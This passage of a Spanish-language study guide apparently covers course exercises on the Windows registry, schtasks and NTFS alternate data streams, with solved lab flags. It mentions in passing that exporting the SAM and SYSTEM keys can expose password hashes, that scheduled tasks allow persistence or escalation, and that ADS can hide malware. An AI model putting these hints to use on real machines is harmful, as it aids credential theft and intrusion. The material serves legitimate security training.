  00,45,00,25,00,5c,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,5c,00,4c,00,
  6f,00,63,00,61,00,6c,00,5c,00,54,00,65,00,6d,00,70,00,00,00
"TMP"=hex(2):25,00,55,00,53,00,45,00,52,00,50,00,52,00,4f,00,46,00,49,00,4c,00,
  45,00,25,00,5c,00,41,00,70,00,70,00,44,00,61,00,74,00,61,00,5c,00,4c,00,6f,
  00,63,00,61,00,6c,00,5c,00,54,00,65,00,6d,00,70,00,00,00
  
C:\>
```

Exportamos la clave HKEY_CURRENT_USER\\environment a un archivo y luego mostramos su contenido con *type*. Una mirada cercana revela que esta clave contiene tres valores expresados ​​en *hexadecimal*: *Path*, *TEMP* y *TMP*. Una vez que hemos exportado una clave, podemos importarla más tarde a otra máquina con el subcomando *reg import*.

**Esto es crucial desde una perspectiva de seguridad, porque dependiendo de las configuraciones y permisos de una máquina, podemos extraer hashes de contraseñas de usuarios exportando las claves SAM y SYSTEM.**

Windows cuenta con mecanismos de seguridad que evitan que se acceda a estas claves mientras se está ejecutando una máquina, pero en algunas circunstancias, se pueden omitir. Una demostración de estas técnicas está más allá del alcance de este Tema. Por ahora, queremos entender que el Registro proporciona una superficie de ataque amplia y abundante que puede permitir que un atacante lea y escriba capacidades en información extremadamente confidencial o consiga permanencia.

<br />

**Exercises 5.6.2**

**1. Que 'data type' del registro representa un tipo string?**

REG_SZ

<br />

**2. ¿Cuál es el valor del 'flag' dentro del Registry Key HKLM\\Software\\Offsec en la target machine?**

Empleamos el comando 'reg query' junto con el path completo de la key para llevar hasta los distinos valores que contiene la clave.

```
offsec@WINDOWS-03 C:\Users\Offsec>reg query HKLM\Software\Offsec

HKEY_LOCAL_MACHINE\Software\Offsec
    Flag    REG_SZ    OS{registry_one_two_three}
```

<br />

**3. Crea un nuevo key-value sobre el key HKLM\\Software\\Student y asignale un valor terminado en nullo (string) de "Now we're cooking with fire". Entonces ejecuta el binario C:\\Users\\Offsec\\Desktop\\registry-exercises\\registry01.exe.

Añadimos la clave mencionada empleando el siguiente comando:

```
offsec@WINDOWS-03 C:\Users\Offsec>reg add  HKLM\Software\Student /v Flag /t REG_SZ /d "Now we're cooking with fire!"
The operation completed successfully.

offsec@WINDOWS-03 C:\Users\Offsec>reg query HKLM\Software\Student 

HKEY_LOCAL_MACHINE\Software\Student
    Flag    REG_SZ    Now we're cooking with fire!
```

Hemos empleado el /v para designar el nombre del key-value, el /t el tipo de dato y por último el /d para especificar el contenido del key-value.

<br /> 

**4. Exporta el key-value "Flag" sonre el key HKLM\\Software\\Sailing. El fichero exportado debe llamarse *export_key* y debe ser guardado en C:\\Users\\Offsec\\Desktop\\registry-exercises\\. Entonces ejecutamos *registry02.exe* para obtener la flag.**

En primer lugar acudimos a la ayuda de Windows y observamos:

```
offsec@WINDOWS-03 C:\Users\Offsec>reg export /?

REG EXPORT KeyName FileName [/y] [/reg:32 | /reg:64]
```

Vemos que es tan sencillo como aportar al comando el key a exportar y la dirección del filesystem al que enviar el archivo exportado:

```
offsec@WINDOWS-03 C:\Users\Offsec>reg export HKLM\Software\Sailing C:\Users\Offsec\Desktop\registry-exercises\exported
_key && Desktop\registry-exercises\registry02.exe
The operation completed successfully.
Correct! Your flag is:
OS{starboard-and-export}

offsec@WINDOWS-03 C:\Users\Offsec>type Desktop\registry-exercises\exported_key
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\Software\Sailing]
"Flag"="May you have fair winds and following seas"
```

<br />

**5. El usuario Purple tiene una flag en su HKCU hive. Accede al valor del key HKCU\\Software\\Offsec para recuperar la flag. Las credenciales de "Purple:Password".

En primer lugar, necesitamos los permisos de Purple y para ello necesitamos abrir una cmd como el. Si tuviéramos acceso a un entorno GUI, utilizaríamos 'runas', sin embargo, dado que sólo tenemos acceso a nivel cli y runas abre una nueva terminal debemos abrir una nueva conexión ssh y una vez dentro con 'reg query' recuperamos el valor de la clave del registro.

```
ssh Purple@<IP>

[...]

Microsoft Windows [Version 10.0.19044.1415]
(c) Microsoft Corporation. All rights reserved.

purple@WINDOWS-03 C:\Users\Purple>reg query HKCU\Software\Offsec

HKEY_CURRENT_USER\Software\Offsec
    Flag    REG_SZ    OS{purple-isn't-even-a-real-color}
```

#### 1.12. Windows Scheduled Tasks.

El Windows *Task Scheduler* nos permite programar aplicaciones o secuencias de comandos para que se ejecuten en momentos predefinidos o mediante determinados desencadenantes. El Scheduler tiene una funcionalidad similar a los cronjobs en Linux. Al igual que con el Registro, Windows puede interactuar con CLI o a través del GUI, nosotros nos centraremos a través del CLI. 

El comando *schtasks* reemplaza al comando *at* ahora en desuso. Intentemos ejecutar schtasks con /? Opción para obtener información de uso:

```
C:\>schtasks /?

SCHTASKS /parameter [arguments]

Description:
    Enables an administrator to create, delete, query, change, run and
    end scheduled tasks on a local or remote system.

Parameter List:
    /Create         Creates a new scheduled task.

    /Delete         Deletes the scheduled task(s).

    /Query          Displays all scheduled tasks.

    /Change         Changes the properties of scheduled task.

    /Run            Runs the scheduled task on demand.

    /End            Stops the currently running scheduled task.

    /ShowSid        Shows the security identifier corresponding to a scheduled task name.

    /?              Displays this help message.

Examples:
    SCHTASKS
    SCHTASKS /?
    SCHTASKS /Run /?
    SCHTASKS /End /?
    SCHTASKS /Create /?
    SCHTASKS /Delete /?
    SCHTASKS /Query  /?
    SCHTASKS /Change /?
    SCHTASKS /ShowSid /?
```

Observamos que podemos realizar varias funciones relacionadas con la programación de tareas, incluida la creación, eliminación, cambio e incluso ejecución de tareas.

Podemos ejecutar schtasks /query o simplemente schtasks sin argumentos para ver una lista de todas las tareas programadas actualmente:

```
C:\>schtasks

Folder: 
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
MicrosoftEdgeUpdateTaskMachineCore       2021-06-06 8:12:08 AM  Ready
MicrosoftEdgeUpdateTaskMachineCore1d6c13 2021-06-05 10:08:35 PM Ready
MicrosoftEdgeUpdateTaskMachineUA         2021-06-05 11:38:35 AM Ready
OneDrive Standalone Update Task-S-1-5-21 2021-06-05 9:49:31 PM  Ready
...
```

Para crear una nueva tarea, podemos usar la opción /create:

```
C:\>schtasks /create /?

SCHTASKS /Create [/S system [/U username [/P [password]]]]
    [/RU username [/RP password]] /SC schedule [/MO modifier] [/D day]
    [/M months] [/I idletime] /TN taskname /TR taskrun [/ST starttime]
    [/RI interval] [ {/ET endtime | /DU duration} [/K] [/XML xmlfile] [/V1]]
    [/SD startdate] [/ED enddate] [/IT | /NP] [/Z] [/F] [/HRESULT] [/?]

Description:
    Enables an administrator to create scheduled tasks on a local or
    remote system.

Parameter List:
    /S   system        Specifies the remote system to connect to. If omitted
                       the system parameter defaults to the local system.

    /U   username      Specifies the user context under which SchTasks.exe
                       should execute.

    /P   [password]    Specifies the password for the given user context.
                       Prompts for input if omitted.

    /RU  username      Specifies the "run as" user account (user context)
                       under which the task runs. For the system account,
                       valid values are "", "NT AUTHORITY\SYSTEM"
                       or "SYSTEM".
                       For v2 tasks, "NT AUTHORITY\LOCALSERVICE" and
                       "NT AUTHORITY\NETWORKSERVICE" are also available as well
                       as the well known SIDs for all three.

    /RP  [password]    Specifies the password for the "run as" user.
                       To prompt for the password, the value must be either
                       "*" or none. This password is ignored for the
                       system account. Must be combined with either /RU or
                       /XML switch.

    /SC   schedule     Specifies the schedule frequency.
                       Valid schedule types: MINUTE, HOURLY, DAILY, WEEKLY,
                       MONTHLY, ONCE, ONSTART, ONLOGON, ONIDLE, ONEVENT.

    /MO   modifier     Refines the schedule type to allow finer control over
                       schedule recurrence. Valid values are listed in the
                       "Modifiers" section below.

    /D    days         Specifies the day of the week to run the task. Valid
                       values: MON, TUE, WED, THU, FRI, SAT, SUN and for
                       MONTHLY schedules 1 - 31 (days of the month).
                       Wildcard "*" specifies all days.

    /M    months       Specifies month(s) of the year. Defaults to the first
                       day of the month. Valid values: JAN, FEB, MAR, APR,
                       MAY, JUN, JUL, AUG, SEP, OCT, NOV, DEC. Wildcard "*"
                       specifies all months.

    /I    idletime     Specifies the amount of idle time to wait before
                       running a scheduled ONIDLE task.
                       Valid range: 1 - 999 minutes.

    /TN   taskname     Specifies the string in the form of path\name
                       which uniquely identifies this scheduled task.

    /TR   taskrun      Specifies the path and file name of the program to be
                       run at the scheduled time.
                       Example: C:\windows\system32\calc.exe

    /ST   starttime    Specifies the start time to run the task. The time
                       format is HH:mm (24 hour time) for example, 14:30 for
                       2:30 PM. Defaults to current time if /ST is not
                       specified.  This option is required with /SC ONCE.

    /RI   interval     Specifies the repetition interval in minutes. This is
                       not applicable for schedule types: MINUTE, HOURLY,
                       ONSTART, ONLOGON, ONIDLE, ONEVENT.
                       Valid range: 1 - 599940 minutes.
                       If either /ET or /DU is specified, then it defaults to
                       10 minutes.

    /ET   endtime      Specifies the end time to run the task. The time format
                       is HH:mm (24 hour time) for example, 14:50 for 2:50 PM.
                       This is not applicable for schedule types: ONSTART,
                       ONLOGON, ONIDLE, ONEVENT.

    /DU   duration     Specifies the duration to run the task. The time
                       format is HH:mm. This is not applicable with /ET and
                       for schedule types: ONSTART, ONLOGON, ONIDLE, ONEVENT.
                       For /V1 tasks, if /RI is specified, duration defaults
                       to 1 hour.

    /K                 Terminates the task at the endtime or duration time.
                       This is not applicable for schedule types: ONSTART,
                       ONLOGON, ONIDLE, ONEVENT. Either /ET or /DU must be
                       specified.

    /SD   startdate    Specifies the first date on which the task runs. The
                       format is yyyy/mm/dd. Defaults to the current
                       date. This is not applicable for schedule types: ONCE,
                       ONSTART, ONLOGON, ONIDLE, ONEVENT.

    /ED   enddate      Specifies the last date when the task should run. The
                       format is yyyy/mm/dd. This is not applicable for
                       schedule types: ONCE, ONSTART, ONLOGON, ONIDLE, ONEVENT.

    /EC   ChannelName  Specifies the event channel for OnEvent triggers.

    /IT                Enables the task to run interactively only if the /RU
                       user is currently logged on at the time the job runs.
                       This task runs only if the user is logged in.

    /NP                No password is stored.  The task runs non-interactively
                       as the given user.  Only local resources are available.

    /Z                 Marks the task for deletion after its final run.

    /XML  xmlfile      Creates a task from the task XML specified in a file.
                       Can be combined with /RU and /RP switches, or with /RP
                       alone, when task XML already contains the principal.

    /V1                Creates a task visible to pre-Vista platforms.
                       Not compatible with /XML.

    /F                 Forcefully creates the task and suppresses warnings if
                       the specified task already exists.

    /RL   level        Sets the Run Level for the job. Valid values are
                       LIMITED and HIGHEST. The default is LIMITED.

    /DELAY delaytime   Specifies the wait time to delay the running of the
                       task after the trigger is fired.  The time format is
                       mmmm:ss.  This option is only valid for schedule types
                       ONSTART, ONLOGON, ONEVENT.

    /HRESULT           For better diagnosability, the process exit code
                       will be in the HRESULT format.

    /?                 Displays this help message.

Modifiers: Valid values for the /MO switch per schedule type:
    MINUTE:  1 - 1439 minutes.
    HOURLY:  1 - 23 hours.
    DAILY:   1 - 365 days.
    WEEKLY:  weeks 1 - 52.
    ONCE:    No modifiers.
    ONSTART: No modifiers.
    ONLOGON: No modifiers.
    ONIDLE:  No modifiers.
    MONTHLY: 1 - 12, or
             FIRST, SECOND, THIRD, FOURTH, LAST, LASTDAY.

    ONEVENT:  XPath event query string.
...
```

Esto demuestra que schtasks es bastante flexible, particularmente debido a la presencia de varias opciones.

- */SC*: nos permite establecer la frecuencia de las tareas en función de un intervalo de tiempo y también desencadenante en particular. Ejemplos de esto incluyen cuando la máquina se inicia cuando un usuario inicia sesión o cuando ocurre un evento en particular. 

- */MO*: Nos permite brindar precisión adicional a los desencadenantes basados ​​en el tiempo. Podemos ver todos los modificadores permitidos en la parte inferior de la lista.

Como ejemplo, imaginemos que deseamos ejecutar un binario llamado runme.exe todos los lunes a las 9:00 AM:

```
C:\>schtasks /create /sc weekly /d mon /tn runme /tr C:\runme.exe /st 09:00
SUCCESS: The scheduled task "runme" has successfully been created.
```

A continuación, podemos eliminar la tarea de la siguiente manera:

```
C:\>schtasks /delete /tn runme
WARNING: Are you sure you want to remove the task "runme" (Y/N)? y
SUCCESS: The scheduled task "runme" was successfully deleted.
```

Recreemos esas tareas programadas y ejecutemos algunos comandos adicionales para obtener una mejor comprensión de la funcionalidad de schtasks.

```
C:\>schtasks /create /sc weekly /d mon /tn runme /tr C:\runme.exe /st 09:00
SUCCESS: The scheduled task "runme" has successfully been created.
```

Ahora que se creó la tarea, podemos usar el parámetro de consulta y el parámetro /fo LIST para mostrar los resultados en una lista.

```
C:\>schtasks /query /TN runme /fo LIST 

Folder: 
HostName:      WINDOWS-03
TaskName:      \runme
Next Run Time: 6/06/2021 9:00:00 AM
Status:        Ready
Logon Mode:    Interactive only
```

Hay muchos recursos maravillosos disponibles para aprender sobre parámetros adicionales que le permiten trabajar en computadoras remotas, ejecutar una tarea con los permisos de diferentes usuarios. También puede ajustar la salida como una tabla, lista o csv, o ajustar el formato para eliminar los encabezados de las columnas o proporcionar una salida más detallada.

El programador de tareas proporciona algunas herramientas de automatización poderosas para un usuario legítimo, pero también representa un vector de ataque versátil. Si obtenemos suficientes permisos en una máquina, podemos usar nuestro acceso para programar acciones maliciosas repetitivas. Si la máquina está mal configurada, es posible que incluso podamos elevar nuestros permisos usando la opción _/RU_ para ejecutar una tarea en el contexto de otros usuarios (por ejemplo, Administrador), en combinación con la opción _/SC_ para establecer una configuración predecible. activador (por ejemplo, cuando el administrador inicia sesión).

<br />

**Exercises**

**1.  ¿Qué activador inicia la tarea cuando un usuario específico se autentica en la máquina?**

Desplegamos la ayuda y obtenemos:

```
C:\>schtasks /create /?

[...]

Modificadores: valores válidos para el modificador /MO por tipo de programación:
    MINUTE:  1 - 1439 minutos.
    HOURLY:  1 - 23 horas.
    DAILY:   1 - 365 días.
    WEEKLY:  semanas 1 - 52.
    ONCE:    sin modificadores.
    ONSTART: sin modificadores.
    ONLOGON: sin modificadores.
    ONIDLE:  sin modificadores.
    MONTHLY: 1 - 12, o
             FIRST, SECOND, THIRD, FOURTH, LAST, LASTDAY.
[...]

```

<br />

**2.  ¿ Qué opción de _schtasks_ muestra todas las tareas programadas actualmente?**

/query

<br />

**3.  ¿Cuál es el nombre de la tarea que se ejecuta diariamente en la hora (cuando el minuto es 00), en la máquina de destino?**

Sabiendo que se ejecuta cuando la hora es a 00 minutos realizamos una búsqueda y filtramos:

```
offsec@WINDOWS-03 C:\Users\Offsec>schtasks /query | findstr 00
donothinguseful                          1/27/2023 2:00:00 PM   Ready
Consolidator                             1/27/2023 6:00:00 AM   Ready
```

<br />

**4. ¿Cuál es el nombre del binario que se ejecuta cuando se ejecuta la tarea anterior?**

Buscamos la tarea programada que se ejecuta y encontramos un fichero con el mismo nombre:

```
offsec@WINDOWS-03 C:\>dir /s /a /b | findstr donothinguseful
C:\Windows\System32\Tasks\donothinguseful
```

De esta forma, lo abrimos y resulta que tenemos un archivo XML que describe la ejecución de un fichero por el usuario Administrator. 

```
offsec@WINDOWS-03 C:\>type C:\Windows\System32\Tasks\donothinguseful
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <URI>\donothinguseful</URI>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2021-12-16T19:00:00Z</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>Administrator</UserId>
      <LogonType>S4U</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>Parallel</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>PT10M</Duration>
      <WaitTimeout>PT1H</WaitTimeout>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT1H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Users\Administrator\Desktop\whiletrue.exe</Command>
    </Exec>
  </Actions>
</Task>
```

<br />

**5. Use schtasks para ejecutar la tarea llamada RunAsSystem para obtener una bandera. El indicador se escribirá en el archivo C:\\Users\\Offsec\\Desktop\\SystemFlag.txt.**

Buscamos en la ayuda del comando *schtask* y vemos que tenemos una opción que nos permite ejecutar tareas programadas:

```
offsec@WINDOWS-03 C:\Users\Offsec>schtasks /?                                              

SCHTASKS /parameter [arguments]

[...]

    /Run            Runs the scheduled task on demand.
```

Así, desplegamos la auyda del subcomando en cuestion:

```
offsec@WINDOWS-03 C:\Users\Offsec>schtasks /RUn /?

SCHTASKS /Run [/S system [/U username [/P [password]]]] [/I]
         /TN taskname [/HRESULT] [/?]
[...]

    /TN    taskname      Specifies the path\name of the task to run now.
```

De esta forma, buscamos la localización de la tarea programada mediante 'dir' y una vez localizado, podemos aplicar el siguiente comando a nuestra situación:

```
offsec@WINDOWS-03 C:\Users\Offsec>schtasks /Run /TN "C:\Windows\System32\Tasks\RunAsSystem" 
ERROR: The filename, directory name, or volume label syntax is incorrect.
```

Sin embargo recibimos un mensaje de error, acudimos al directorio en cuestión para verificar la existencia del fichero y volvemos a intertalo:

```
offsec@WINDOWS-03 C:\Windows\System32\Tasks>schtasks /Run /TN "RunAsSystem"                           
SUCCESS: Attempted to run the scheduled task "RunAsSystem".

offsec@WINDOWS-03 C:\Windows\System32\Tasks>type C:\Users\Offsec\Desktop\SystemFlag.txt                               
OS{Now-You-Are-Become-Me}
```

<br />

**6.  Cree una tarea llamada *binarycommandments* que ejecute cmd.exe cada vez que se reinicie la máquina. Luego ejecute el binario C:\\Users\\Offsec\\Desktop\\checktasks.exe para obtener el indicador.**

Abrimos la ayuda del subcomando schtasks /create:

```
offsec@WINDOWS-03 C:\>schtasks /create /? 

SCHTASKS /Create [/S system [/U username [/P [password]]]]
    [/RU username [/RP password]] /SC schedule [/MO modifier] [/D day]
    [/M months] [/I idletime] /TN taskname /TR taskrun [/ST starttime]
    [/RI interval] [ {/ET endtime | /DU duration} [/K] [/XML xmlfile] [/V1]]
    [/SD startdate] [/ED enddate] [/IT | /NP] [/Z] [/F] [/HRESULT] [/?]
```

Observamos que las opciones obligatorias son, /SC, /TR y /TN. Explorando la ayuda vemos que:

- */SC*: Se corresponde con el intervalo de tiempo o evento desencadenante, en nuestro caso ONSTART, cuando el equipo se enciende.

- */TR*: La ruta o path del ejecutable a correr, en nuestro caso "C:\\Windows\\System32\\cmd.exe"

- */TN*: El nombre del scheduled task. En nuestro caso según el enunciado: binarycommandments.

De forma que el comando queda tal que así:

```
offsec@WINDOWS-03 C:\>schtasks /create /SC ONSTART /TR "C:\WINDOWS\System32\cmd.exe" /TN binarycommandments
SUCCESS: The scheduled task "binarycommandments" has successfully been created.

offsec@WINDOWS-03 C:\>C:\Users\Offsec\Desktop\checktasks.exe
Well scheduled! Your flag is:
OS{thou-shalt-not-modify-the-registry-without-care}
```

<br />

#### 1.13. Windows Disk Utilities.

El file system NTFS de Windows es más complejo que los equivalentes basados ​​en Unix. Según Microsoft, NTFS proporciona mayor confiabilidad, flexibilidad y seguridad en comparación con su predecesor, *FAT32*. 

Nos centraremos en algunas herramientas predeterminadas y algunas herramientas de Sysinternals que podemos usar para recuperar información útil sobre el uso del disco.

<br />

- *fsutil*

En términos de utilidades integradas, Windows viene con el *fsutil* set que pueden administrar unidades. Podemos ver la lista completa de herramientas incluidas en la suite invocando el comando sin parámetros:

```
C:\>fsutil
---- Commands Supported ----

8dot3name         8dot3name management
behavior          Control file system behavior
dax               Dax volume managemen
dirty             Manage volume dirty bit
file              File specific commands
fsInfo            File system information
hardlink          Hardlink managemen
objectID          Object ID management
quota             Quota management
repair            Self healing managemen
reparsePoint      Reparse point management
storageReserve    Storage Reserve management
resource          Transactional Resource Manager management
sparse            Sparse file control
tiering           Storage tiering property management
transaction       Transaction management
usn               USN managemen
volume            Volume managemen
wim               Transparent wim hosting management
```

Tenga en cuenta que la opción /? no funciona con el comando fsutil. En su lugar, necesitaremos hacer referencia a un subcomando en particular sin argumentos adicionales para entender lo que hace. 

Comencemos con *fsutil fsinfo*, que puede proporcionar información específica de la unidad. Escribir *fsutil fsinfo* sin ningún argumento proporcionará una tercera capa de subcomandos:

```
C:\>fsutil fsinfo
---- FSINFO Commands Supported ----

drives          List all drives
driveType       Query drive type for a drive
ntfsInfo        Query NTFS specific volume information
refsInfo        Query REFS specific volume information
sectorInfo      Query sector information
statistics      Query file system statistics
volumeInfo      Query volume information
```

Podemos encontrar todas las unidades en nuestra máquina con el subcomando drives :

```
C:\>fsutil fsinfo drives

Drives: C:\ F:\ Z:\
```

Observamos que hay tres unidades montadas en esta máquina. Examinemos las unidades individuales con el subcomando *drivetype*:

```
C:\>fsutil fsinfo drivetype C:
C: - Fixed Drive

C:\>fsutil fsinfo drivetype F:
F: - CD-ROM Drive

C:\>fsutil fsinfo drivetype Z:
Z: - Fixed Drive
```

Vemos que las unidades C: y Z: están fijas a la máquina, mientras que la unidad F: es una unidad de CD-ROM extraíble. Para recuperar información más extensa sobre las unidades, podemos usar el subcomando *volumeinfo*:

```
C:\>fsutil fsinfo volumeinfo C:
Volume Name :
Volume Serial Number : 0x51324363
Max Component Length : 255
File System Name : NTFS
Is ReadWrite
Not Thinly-Provisioned
Supports Case-sensitive filenames
Preserves Case of filenames
Supports Unicode in filenames
Preserves & Enforces ACL's
Supports file-based Compression
Supports Disk Quotas
Supports Sparse files
Supports Reparse Points
Returns Handle Close Result Information
Supports POSIX-style Unlink and Rename
Supports Object Identifiers
Supports Encrypted File System
Supports Named Streams
Supports Transactions
Supports Hard Links
Supports Extended Attributes
Supports Open By FileID
Supports USN Journal
```

Confirma que nuestra unidad C: de hecho está formateada para NTFS y nos brinda una descripción general amplia de sus propiedades.

Si bien *fsinfo* y, en general, *fsutil* tienen muchos otros subcomandos y funciones, no suelen ser necesarios para aprender los conceptos básicos iniciales de las pruebas de penetración o la seguridad. Le animamos a que revise la documentación de Microsoft si está más interesado en este amplio tema.

<br />

- *du.exe (Sysinternals)*

Es posible que deseemos una forma rápida de ver el uso del disco a través de la línea de comandos. Windows no viene con el comando *du* de Linux para estimar el uso del espacio de archivos, pero Sysinternals proporciona su propia implementación. Podemos usar *du.exe* para informar sobre el uso del disco:

```
C:\Users\Offsec\Downloads\SysinternalsSuite>du

DU v1.62 - Directory disk usage reporter
Copyright (C) 2005-2018 Mark Russinovich
Sysinternals - www.sysinternals.com

usage: du [-c[t]] [-l <levels> | -n | -v] [-u] [-q] <directory>
   -c     Print output as CSV. Use -ct for tab delimiting.
          Use -nobanner to suppress banner.
   -l     Specify subdirectory depth of information (default is one level).
   -n     Do not recurse.
   -q     Quiet.
   -nobanner
          Do not display the startup banner and copyright message.
   -u     Count each instance of a hardlinked file.
   -v     Show size (in KB) of all subdirectories.

CSV output is formatted as:
Path,CurrentFileCount,CurrentFileSize,FileCount,DirectoryCount,DirectorySize,DirectorySizeOnDisk
```

Para ver el uso de una unidad en particular, la proporcionamos como entrada a du:

```
C:\Users\Offsec\Downloads\SysinternalsSuite>du c:

DU v1.62 - Directory disk usage reporter
Copyright (C) 2005-2018 Mark Russinovich
Sysinternals - www.sysinternals.com

Files:        162
Directories:  1
Size:         109,852,612 bytes
Size on disk: 110,185,248 bytes
```

Una inspección minuciosa del Listado 49 revelará que el tamaño real del uso de nuestro disco es de alguna manera menor que el tamaño de la unidad en el disco. Este último atributo representa el número total de bytes que ocupa un archivo o directorio; en este caso, toda la unidad C:.

La razón por la que el tamaño en el disco puede ser mayor que el tamaño es que cuando se crea un archivo en NTFS, se le asigna un conjunto particular de *clústeres*. Incluso si un archivo ocupa _X_ unidades de espacio, se le asignará el tamaño completo de los clústeres en los que debe caber. Para un ejemplo simple, imagine que nuestro sistema de archivos está configurado para almacenar datos en clústeres de 512 bytes. Si creamos un archivo que ocupa 500 bytes de espacio, aún utilizará los 512 bytes completos del clúster al que está asignado. Por lo tanto, normalmente perderemos una pequeña cantidad de espacio en cada asignación de archivos.

También podemos usar du para analizar el uso del espacio de un directorio suministrado:

```
C:\Users\Offsec\Downloads\SysinternalsSuite>du c:\users

DU v1.62 - Directory disk usage reporter
Copyright (C) 2005-2018 Mark Russinovich
Sysinternals - www.sysinternals.com

Files:        90740
Directories:  14739
Size:         84,302,189,204 bytes
Size on disk: 84,716,127,000 bytes
```

Tenga en cuenta de nuevo cómo el tamaño en el disco es mayor que el tamaño.

<br />

- *Stream & ADS*

Terminemos esta sección volviendo a uno de los primeros comandos de Windows que aprendimos, dir. Ahora que sabemos un poco más sobre NTFS, podemos considerar la opción *dir /R* , que es útil para identificar Alternative Data Streams (ADS).

Un 'stream' es una propiedad de los archivos bajo NTFS que esencialmente nos permite almacenar contenido dentro de *secciones* arbitrarias del archivo. Cuando creamos un nuevo archivo, el contenido se almacena en eldefault data stream. Cuando queramos recuperar los contenidos (por ejemplo, con *type*), leeremos de ese stream predeterminado.

ADS permite que los archivos contengan múltiples data stream. Podemos colocar contenido en un nuevo flujo de datos con la sintaxis :\<stream\> usando echo.

Por ejemplo:

```
C:\streamtest>echo fileOne uses the default stream > defaultStream.txt

C:\streamtest>echo fileTwo uses the 'offsec' stream > offsecStream.txt:offsec

C:\streamtest>type defaultStream.txt
fileOne uses the default stream

C:\streamtest>type offsecStream.txt

C:\streamtest>dir
 Volume in drive C has no label.
 Volume Serial Number is 523D-9369

 Directory of C:\streamtest

2021-06-03  03:39 PM    <DIR>          .
2021-06-03  03:39 PM    <DIR>          ..
2021-06-03  03:38 PM                34 defaultStream.txt
2021-06-03  03:39 PM                 0 offsecStream.txt
               2 File(s)             34 bytes
               2 Dir(s)  31,895,818,240 bytes free
```

Primero creamos dos archivos. El primero usa el stream por defecto y el segundo usa un stream alternativo arbitrario que llamamos 'offsec'. Cuando usamos type para enumerar el contenido de los archivos, generamos defaultStream.txt como se esperaba, pero offsecStream.txt parece estar vacío. Además, dir informa que offsecStream.txt contiene 0 bytes de datos.

Aquí es donde entran las opciones /R . Podemos usar dir /R para ver si algún archivo en el directorio utiliza flujos de datos alternativos:

```
C:\streamtest>dir /r
 Volume in drive C has no label.
 Volume Serial Number is 523D-9369

 Directory of C:\streamtest

2021-06-03  03:39 PM    <DIR>          .
2021-06-03  03:39 PM    <DIR>          ..
2021-06-03  03:38 PM                34 defaultStream.txt
2021-06-03  03:39 PM                 0 offsecStream.txt
                                    35 offsecStream.txt:offsec:$DATA
               2 File(s)             34 bytes
               2 Dir(s)  31,939,903,488 bytes free
```

Interesante, dir aún informa que el uso total del espacio es de 34 bytes; este resultado no incluye los 35 bytes que pertenecen a offsecStream.txt . Una vez más, podemos usar du para ver el uso real del disco:

```
C:\Users\Offsec\Downloads\SysinternalsSuite>du c:\streamtest

DU v1.62 - Directory disk usage reporter
Copyright (C) 2005-2018 Mark Russinovich
Sysinternals - www.sysinternals.com

Files:        2
Directories:  1
Size:         69 bytes
Size on disk: 12,328 bytes
```

Podríamos esperar una sintaxis como *type offsecStream.txt:offsec* para generar el contenido de un ADS, pero desafortunadamente, no es así:

```
C:\streamtest>type offsecStream.txt:offsec
The filename, directory name, or volume label syntax is incorrect.

```

Sin embargo, podemos usar el comando *more* con una sintaxis similar:

```
C:\streamtest>more < offsecStream.txt:offsec
fileTwo uses the 'offsec' stream
```

Tenga en cuenta que primero tuvimos que usar el carácter "<" para pasar el contenido de offsecStream.txt a la entrada estándar y luego redirigirlo a more. Esto se debe a que pasar un ADS directamente a more tampoco funciona:

```
C:\streamtest>more offsecStream.txt:offsec
Cannot access file C:\streamtest\offsecStream.txt:offsec
```

Si bien Windows y otros programas aprovechan ADS por razones benévolas, desde una perspectiva de seguridad, **ADS es importante porque el malware o la información confidencial pueden ocultarse dentro de los archivos**. La opción dir /r así como la herramienta Sysinternals *streams* nos permiten detectar el uso de ADS.

<br />

**Exercises 5.8.1**

**1. ¿Qué archivo dentro de C:\\Users\\Offsec\\Desktop\\streamtest tiene una transmisión ADS?

Acudimos al directorio y ejecutamos el comando 'dir /R':

```
offsec@WINDOWS-03 C:\Users\Offsec\Desktop\streamtest>dir /r
 Volume in drive C has no label.
 Volume Serial Number is 8EBB-A760

 Directory of C:\Users\Offsec\Desktop\streamtest

12/16/2021  02:58 PM    <DIR>          .
12/16/2021  02:58 PM    <DIR>          ..
12/16/2021  02:58 PM                 0 eight.txt
12/16/2021  02:58 PM                 0 five.txt
12/16/2021  02:58 PM                 0 four.txt
12/16/2021  02:58 PM                 0 nine.txt
12/16/2021  02:58 PM                 0 one.txt
12/16/2021  02:58 PM                 0 seven.txt
12/16/2021  02:58 PM                 0 six.txt
                                    45 six.txt:try:$DATA
12/16/2021  02:58 PM                 0 ten.txt
12/16/2021  02:58 PM                 0 three.txt
12/16/2021  02:58 PM                 0 two.txt
              10 File(s)              0 bytes
               2 Dir(s)   6,812,061,696 bytes free
```

Así, el que tiene dos streams es 'six.txt'.

<br />

